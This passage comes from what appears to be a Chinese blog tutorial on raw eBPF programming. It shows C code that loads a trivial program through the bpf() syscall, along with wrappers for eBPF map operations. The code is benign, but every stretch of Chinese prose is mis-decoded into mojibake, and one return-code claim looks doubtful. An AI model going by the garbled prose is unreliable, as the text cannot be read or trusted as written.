align="center">åŸå­åŠ </td></tr><tr><td align="center">BPF_OR</td><td align="center">0x40</td><td align="center">åŸå­æˆ–</td></tr><tr><td align="center">BPF_AND</td><td align="center">0x50</td><td align="center">åŸå­ä¸</td></tr><tr><td align="center">BPF_XOR</td><td align="center">0xa0</td><td align="center">åŸå­å¼‚æˆ–</td></tr></tbody></table><blockquote><p><del>åæ­£ğŸ‘´çœ‹å¾—æ˜¯æœ‰ç‚¹å¤´å¤§çš„</del></p></blockquote><h2 id="äºŒã€raw-eBPF-ç¨‹åºç¼–å†™"><a href="#äºŒã€raw-eBPF-ç¨‹åºç¼–å†™" class="headerlink" title="äºŒã€raw eBPF ç¨‹åºç¼–å†™"></a>äºŒã€raw eBPF ç¨‹åºç¼–å†™</h2><p>ä¸€ä¸ªæœ€ç®€å•çš„ eBPF ç¨‹åº<strong>ä¾¿æ˜¯ä¸€ä¸ª</strong> <code>bpf_insn</code> <strong>ç»“æ„ä½“æ•°ç»„</strong>ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨ç”¨æˆ·æ€ä¸‹ç¼–å†™ä¸€ä¸ª <code>bpf_insn</code> ç»“æ„ä½“æ•°ç»„å¹¶ç›´æ¥è°ƒç”¨ <code>bpf()</code> ç³»ç»Ÿè°ƒç”¨å®Œæˆ eBPF ç¨‹åºçš„åˆ›å»ºä¸æŒ‚è½½ï¼šï¼‰</p><p>æœ€ç®€å•çš„æ–¹æ³•ä¾¿æ˜¯ç›´æ¥æŒ‰å¦‚ä¸‹å½¢å¼å®šä¹‰ä¸€æ¡åŸºæœ¬çš„ eBPF æŒ‡ä»¤ï¼š</p><blockquote><p> æ³¨ï¼šè¿™é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨å†…æ ¸æºç ç›®å½•ä¸‹æä¾›çš„ <code>/samples/bpf/bpf_insn.h</code> ï¼šï¼‰</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)        \</span><br><span class="hljs-meta">    ((struct bpf_insn) &#123;                              \</span><br><span class="hljs-meta">        .code         = CODE,                         \</span><br><span class="hljs-meta">        .dst_reg     = DST,                           \</span><br><span class="hljs-meta">        .src_reg     = SRC,                           \</span><br><span class="hljs-meta">        .off         = OFF,                           \</span><br><span class="hljs-meta">        .imm         = IMM                            \</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></td></tr></table></figure><p>ä¹‹åç›´æ¥å¼€å†™å°±è¡Œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬åº”å½“ä»¥ä¸€æ¡ <code>è·³è½¬ç»“æŸæŒ‡ä»¤</code> ï¼ˆopcode ä¸º <code>BPF_JMP | BPF_EXIT</code> ï¼‰ä½œä¸ºç»“å°¾ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/bpf.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)          \</span><br><span class="hljs-meta">    ((struct bpf_insn) &#123;                                \</span><br><span class="hljs-meta">        .code        = CODE,                            \</span><br><span class="hljs-meta">        .dst_reg     = DST,                             \</span><br><span class="hljs-meta">        .src_reg     = SRC,                             \</span><br><span class="hljs-meta">        .off         = OFF,                             \</span><br><span class="hljs-meta">        .imm         = IMM                              \</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">test_bpf_prog</span>[] =</span> &#123;<br>    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x114514</span>),<br>    BPF_RAW_INSN(BPF_JMP | BPF_EXIT, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TEST_BPF_LOG_SZ 0x10000</span><br><span class="hljs-type">char</span> test_bpf_log_buf[TEST_BPF_LOG_SZ] = &#123; <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">test_bpf_attr</span> =</span> &#123;<br>    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,<br>    .insns = (<span class="hljs-type">uint64_t</span>) &amp;test_bpf_prog,<br>    .insn_cnt = <span class="hljs-keyword">sizeof</span>(test_bpf_prog) / <span class="hljs-keyword">sizeof</span>(test_bpf_prog[<span class="hljs-number">0</span>]),<br>    .license = (<span class="hljs-type">uint64_t</span>) <span class="hljs-string">&quot;GPL&quot;</span>,<br>    .log_level = <span class="hljs-number">2</span>,<br>    .log_buf = (<span class="hljs-type">uint64_t</span>) test_bpf_log_buf,<br>    .log_size = TEST_BPF_LOG_SZ,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-type">int</span> cmd, <span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_bpf, cmd, attr, <span class="hljs-keyword">sizeof</span>(*attr));<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> test_bpf_prog_fd;<br>    <span class="hljs-type">char</span> *err_msg;<br><br>    <span class="hljs-comment">/* load bpf prog into kernel */</span><br>    test_bpf_prog_fd = bpf(BPF_PROG_LOAD, &amp;test_bpf_attr);<br>    <span class="hljs-keyword">if</span> (test_bpf_prog_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_msg = <span class="hljs-string">&quot;FAILED to load bpf program!&quot;</span>;<br>        <span class="hljs-keyword">goto</span> err_bpf_load;<br>    &#125;<br><br>    <span class="hljs-comment">/* output the log */</span><br>    <span class="hljs-built_in">puts</span>(test_bpf_log_buf);<br><br>    close(test_bpf_prog_fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err_bpf_load:<br>    <span class="hljs-built_in">puts</span>(test_bpf_log_buf);<br>err_socket:<br>    err_exit(err_msg);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å†…æ ¸ä¼šå°†ç›¸å…³çš„è¿è¡Œæ—¥å¿—å†™å…¥åˆ°æˆ‘ä»¬æ‰€æŒ‡å®šçš„ç¼“å†²åŒºå½“ä¸­ï¼Œè¿™é‡Œè¾“å‡ºæ—¥å¿—ç¼“å†²åŒºå¯ä»¥çœ‹åˆ°å†…æ ¸æˆåŠŸåœ°è§£æäº†æˆ‘ä»¬çš„ eBPF ç¨‹åºï¼š</p><p><img src="https://s2.loli.net/2023/05/31/6wJAz7CSFG91DmQ.png" alt="image.png"></p><h2 id="ä¸‰ã€raw-eBPF-map-ä½¿ç”¨"><a href="#ä¸‰ã€raw-eBPF-map-ä½¿ç”¨" class="headerlink" title="ä¸‰ã€raw eBPF map ä½¿ç”¨"></a>ä¸‰ã€raw eBPF map ä½¿ç”¨</h2><p>eBPF map ä¸ºä»¥ <code>keyâ†’value</code> æ˜ å°„æ ¼å¼å­˜å‚¨æ•°æ®çš„é€šç”¨çš„æ•°æ®å­˜å‚¨ç»“æ„ï¼Œç”¨äºåœ¨ä¸åŒç¨‹åºä¹‹é—´å…±äº«æ•°æ®ï¼Œæœ¬èŠ‚ä¸»è¦ä»‹ç» eBPF map çš„åŸºæœ¬ç”¨æ³•</p><h3 id="åˆ›å»º-eBPF-map"><a href="#åˆ›å»º-eBPF-map" class="headerlink" title="åˆ›å»º eBPF map"></a>åˆ›å»º eBPF map</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>BPF_MAP_CREATE</code> å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–°çš„ eBPF mapï¼Œå…¶ä¼šè¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ä½œä¸ºè¯¥ map çš„å¼•ç”¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_create</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> map_type, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key_size, </span><br><span class="hljs-params">               <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> value_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_entries)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_type = map_type,<br>        .key_size = key_size,<br>        .value_size = value_size,<br>        .max_entries = max_entries,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ›´æ–°-eBPF-map"><a href="#æ›´æ–°-eBPF-map" class="headerlink" title="æ›´æ–° eBPF map"></a>æ›´æ–° eBPF map</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>BPF_MAP_UPDATE</code> å‘½ä»¤æ›´æ–° map ä¸­å¯¹åº”çš„ <code>keyâ†’value</code> æ˜ å°„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_update_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *key,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *value,<span class="hljs-type">uint64_t</span> flags)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .value = (<span class="hljs-type">uint64_t</span>) value,<br>        .flags = flags,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><p>flags åº”å½“ä¸ºå¦‚ä¸‹ä¹‹ä¸€ï¼š</p><table><thead><tr><th align="center">flags</th><th align="center">æè¿°</th><th align="center">å¤‡æ³¨</th></tr></thead><tbody><tr><td align="center">BPF_ANY</td><td align="center">æœ‰åˆ™æ›´æ–°ï¼Œæ— åˆ™æ–°å»º</td><td align="center"></td></tr><tr><td align="center">BPF_NOEXIST</td><td align="center">ä»…åœ¨ä¸å­˜åœ¨æ—¶è¿›è¡Œåˆ›å»º</td><td align="center">è‹¥å·²æœ‰å¯¹åº”çš„ key åˆ™è¿”å› <code>-EEXIST</code></td></tr><tr><td align="center">BPF_EXIST</td><td align="center">ä»…åœ¨å­˜åœ¨æ—¶è¿›è¡Œæ›´æ–°</td><td align="center">è‹¥æ— å¯¹åº”çš„ key åˆ™è¿”å› <code>-ENOENT</code></td></tr></tbody></table><p>åœ¨åˆ›å»ºæ–°æ˜ å°„æ—¶è‹¥ map ä¸­æ˜ å°„æ•°é‡å·²ç»è¾¾åˆ° <code>max_entries</code> åˆ™ä¼šè¿”å› <code>E2BIG</code></p><h3 id="åœ¨-eBPF-map-ä¸­æŸ¥æ‰¾"><a href="#åœ¨-eBPF-map-ä¸­æŸ¥æ‰¾" class="headerlink" title="åœ¨ eBPF map ä¸­æŸ¥æ‰¾"></a>åœ¨ eBPF map ä¸­æŸ¥æ‰¾</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>BPF_MAP_LOOKUP_ELEM</code> å‘½ä»¤æŸ¥æ‰¾ map ä¸­æ˜¯å¦å­˜åœ¨å¯¹åº”çš„ keyï¼Œè‹¥æ˜¯åˆ™å†…æ ¸ä¼šå°† value æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´æŒ‡å®šçš„ value ç¼“å†²åŒºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_lookup_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key, <span class="hljs-type">void</span> *value)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .value = (<span class="hljs-type">uint64_t</span>) value,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="éå†-eBPF-map"><a href="#éå†-eBPF-map" class="headerlink" title="éå† eBPF map"></a>éå† eBPF map</h3><p><code>BPF_MAP_GET_NEXT_KEY</code> æ˜¯ä¸€ä¸ªéå¸¸æœ‰æ„æ€çš„å‘½ä»¤ï¼Œå…¶ä¼šåœ¨ map ä¸­æŸ¥æ‰¾æˆ‘ä»¬æ‰€ä¼ å…¥çš„ keyï¼Œå¹¶å°†è¯¥ key çš„ä¸‹ä¸€ä¸ª key æ‹·è´å›ç”¨æˆ·ç©ºé—´ï¼Œè‹¥ä¸å­˜åœ¨è¯¥ key åˆ™ä¼šè¿”å› 0 å¹¶æ‹·è´ map ä¸­ç¬¬ä¸€ä¸ª key åˆ°ç”¨æˆ·ç©ºé—´ï¼Œè‹¥è¯¥ key ä¸ºæœ€åä¸€ä¸ª key åˆ™è¿”å› <code>-1</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_get_next_key</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key, <span class="hljs-type">void</span> *value)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .next_key = (<span class="hljs-type">uint64_t</span>) value,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨è¿™ä¸ªå‘½ä»¤æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿åœ°éå†ä¸€ä¸ª eBPF mapï¼šå…ˆä¼ å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„ key è·å–åˆ° map ä¸­çš„ç¬¬ä¸€ä¸ª keyï¼Œæ¥ä¸‹æ¥å†ä¸æ–­ <code>BPF_MAP_GET_NEXT_KEY</code> ç›´åˆ°è¿”å› <code>-1</code> å³å¯</p><h3 id="åˆ é™¤-eBPF-map-æ•°æ®"><a href="#åˆ é™¤-eBPF-map-æ•°æ®" class="headerlink" title="åˆ é™¤ eBPF map æ•°æ®"></a>åˆ é™¤ eBPF map æ•°æ®</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>BPF_MAP_DELETE_ELEM</code> å‘½ä»¤åˆ é™¤ map ä¸­å·²æœ‰çš„æ˜ å°„ï¼Œè‹¥ä¸å­˜åœ¨åˆ™ä¼šè¿”å› <code>-EPERM</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_delete_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é”€æ¯-eBPF-map"><a href="#é”€æ¯-eBPF-map" class="headerlink" title="é”€æ¯ eBPF map"></a>é”€æ¯ eBPF map</h3><p>åœ¨å†…æ ¸çš„ eBPF map æ•°æ®ç»“æ„ä¸­ä¼šä¿å­˜å¼•ç”¨äº†è¯¥ map çš„ç¨‹åºæ•°é‡ï¼Œè‹¥è¯¥ map ä¸å†è¢«ä»»ä¸€ç¨‹åºå¼•ç”¨åˆ™ä¼šè‡ªåŠ¨é‡Šæ”¾ï¼Œå› æ­¤æˆ‘ä»¬å¹¶ä¸éœ€è¦ä¸»åŠ¨å»é”€æ¯ä¸€ä¸ª eBPF mapï¼šï¼‰</p><h3 id="ä¸€ä¸ªğŸŒ°ç¨‹åº"><a href="#ä¸€ä¸ªğŸŒ°ç¨‹åº" class="headerlink" title="ä¸€ä¸ªğŸŒ°ç¨‹åº"></a><em>ä¸€ä¸ªğŸŒ°ç¨‹åº</em></h3><p>ä¸‹é¢æ˜¯ä½¿ç”¨ eBPF map çš„ä¸€ä¸ªç¤ºğŸŒ°ç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/if.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/if_packet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/if_ether.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/bpf.h&gt;</span></span><br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-type">int</span> cmd, <span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_bpf, cmd, attr, <span class="hljs-keyword">sizeof</span>(*attr));<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_create</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> map_type, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key_size, </span><br><span class="hljs-params">               <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> value_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_entries)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_type = map_type,<br>        .key_size = key_size,<br>        .value_size = value_size,<br>        .max_entries = max_entries,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_lookup_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key, <span class="hljs-type">void</span> *value)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .value = (<span class="hljs-type">uint64_t</span>) value,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_update_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *key,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *value,<span class="hljs-type">uint64_t</span> flags)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .value = (<span class="hljs-type">uint64_t</span>) value,<br>        .flags = flags,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_delete_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span 